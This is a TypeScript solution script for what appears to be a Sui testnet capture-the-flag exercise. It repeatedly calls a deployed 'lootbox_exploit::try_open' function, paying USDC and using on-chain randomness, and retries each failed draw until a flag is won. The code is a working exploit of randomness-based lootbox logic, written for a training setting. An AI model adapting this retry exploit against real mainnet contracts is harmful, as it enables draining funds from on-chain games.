import { SuiGrpcClient } from '@mysten/sui/grpc';
import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
import keyPairJson from "../keypair.json" with { type: "json" };
import { Transaction } from '@mysten/sui/transactions';

/**
 *
 * Global variables
 *
 * These variables can be used throughout the exercise below.
 *
 */

const EXPLOIT_PACKAGE_ID = "0xe8621bb9569f0c6cd30296e5b67cbb7279467295d6cebc536bdd2e1208c8c1ba";
const RANDOM_ID = "0x8";
const REQUIRED_PAYMENT = 15_000_000;

const USDC_COIN_ID = "0x07c5547791a5fec28fcb9e4d09dd9aac69dcb3cebeda864e48390a0f82772d73";

const keypair = Ed25519Keypair.fromSecretKey(keyPairJson.privateKey);
const suiAddress = keypair.getPublicKey().toSuiAddress();

const suiClient = new SuiGrpcClient({
	network: 'testnet',
	baseUrl: 'https://fullnode.testnet.sui.io:443',
});

function sleep(ms: number) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

(async () => {
  console.log("Using address:", suiAddress);

  let attempt = 0;

  while (true) {
    attempt += 1;
    console.log(`Attempt #${attempt}`);

    try {
      const tx = new Transaction();
      tx.setSender(suiAddress);
      tx.setGasBudget(10_000_000);

      const [payment] = tx.splitCoins(
        tx.object(USDC_COIN_ID),
        [REQUIRED_PAYMENT]
      );

      tx.moveCall({
        target: `${EXPLOIT_PACKAGE_ID}::lootbox_exploit::try_open`,
        arguments: [payment, tx.object(RANDOM_ID)],
      });

      const result = await suiClient.signAndExecuteTransaction({
        signer: keypair,
        transaction: tx,
        options: {
          showEffects: true,
          showObjectChanges: true,
        },
      });

      if (result?.$kind === "FailedTransaction") {
        console.log("No flag this try.");
        await sleep(1000);
        continue;
      }

      console.log("FLAG WON!");
      console.log(JSON.stringify(result, null, 2));
      break;
    } catch (e: any) {
      const msg = e?.executionError?.message ?? e?.message ?? "";

      if (
        msg.includes("lootboxes::extract_flag") &&
        msg.includes("abort code: 0")
      ) {
        console.log("No flag this try.");
        await sleep(1000);
        continue;
      }

      console.error("Unexpected error:");
      console.error(e);
      break;
    }
  }
})();